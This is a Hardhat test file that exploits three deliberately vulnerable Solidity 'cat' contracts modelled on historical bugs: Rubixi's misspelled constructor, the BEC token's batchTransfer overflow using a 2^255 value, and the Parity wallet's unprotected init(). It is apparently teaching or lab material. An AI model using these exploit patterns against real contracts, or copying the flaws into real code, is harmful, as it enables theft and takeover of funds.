const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("BugCats v4 Tests", function () {
  let owner, attacker;
  let misspelledCat, overflowCat, unprotectedCat;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    const MisspelledCat = await ethers.getContractFactory("MisspelledCat");
    misspelledCat = await MisspelledCat.deploy();

    const OverflowCat = await ethers.getContractFactory("OverflowCat");
    overflowCat = await OverflowCat.deploy();

    const UnprotectedCat = await ethers.getContractFactory("UnprotectedCat");
    unprotectedCat = await UnprotectedCat.deploy();
  });

  it("Should make MisspelledCat meow - owner is 0x0 due to misspelled constructor", async function () {
    // MisspeledCat function doesn't match contract name, so owner remains 0x0
    // Anyone can call caress since msg.sender == 0x0 is false, but we need to check the actual behavior
    
    // The vulnerability: constructor was never called, so owner is 0x0
    expect(await misspelledCat.owner()).to.equal("0x0000000000000000000000000000000000000000");
    
    // Since owner is 0x0, the condition msg.sender == owner will never be true
    // So this contract can never meow through caress() - this is the bug!
    
    // But we can call the misspelled function to set owner
    await misspelledCat.MisspeledCat(owner.address);
    expect(await misspelledCat.owner()).to.equal(owner.address);
    
    // Now owner can make it meow
    await expect(misspelledCat.caress())
      .to.emit(misspelledCat, "Meow")
      .withArgs(owner.address, "misspelled");
  });

  it("Should make OverflowCat meow - exploit integer overflow", async function () {
    // The vulnerability: count * _value can overflow, bypassing the balance check
    // count = 2, _value = 2^255 → amount = 2 * 2^255 = 2^256 = 0 (overflow)
    
    const receivers = [owner.address, attacker.address]; // count = 2, include sender
    const largeValue = "57896044618658097711785492504343953926634992332820282019728792003956564819968"; // 2^255
    
    // amount = 2 * 2^255 = 0 (overflow)
    // require: _value > 0 ✓ && balance[sender]=0 >= amount=0 ✓
    // balance[sender] -= 0 → still 0
    // balance[receivers] += 2^255 each (including sender!)
    await overflowCat.batchTransfer(receivers, largeValue);
    
    const balance = await overflowCat.balance(owner.address);
    console.log("Owner balance after overflow:", balance.toString());
    
    await expect(overflowCat.caress())
      .to.emit(overflowCat, "Meow")
      .withArgs(owner.address, "overflow");
  });

  it("Should make UnprotectedCat meow - exploit unprotected initialization", async function () {
    // The vulnerability: init() has no access control, anyone can call it
    
    // Initially owner is 0x0 and not initialized
    expect(await unprotectedCat.owner()).to.equal("0x0000000000000000000000000000000000000000");
    expect(await unprotectedCat.initialized()).to.equal(false);
    
    // Attacker can initialize and become owner
    await unprotectedCat.connect(attacker).init(attacker.address);
    
    expect(await unprotectedCat.owner()).to.equal(attacker.address);
    expect(await unprotectedCat.initialized()).to.equal(true);
    
    // Now attacker can make it meow
    await expect(unprotectedCat.connect(attacker).caress())
      .to.emit(unprotectedCat, "Meow")
      .withArgs(attacker.address, "unprotected");
  });

  it("Should verify all cats remember their historical vulnerabilities", async function () {
    console.log("MisspelledCat remembers Rubixi:", await misspelledCat.remember());
    console.log("OverflowCat remembers BecToken:", await overflowCat.remember());
    console.log("UnprotectedCat remembers WalletLibrary:", await unprotectedCat.remember());
  });
});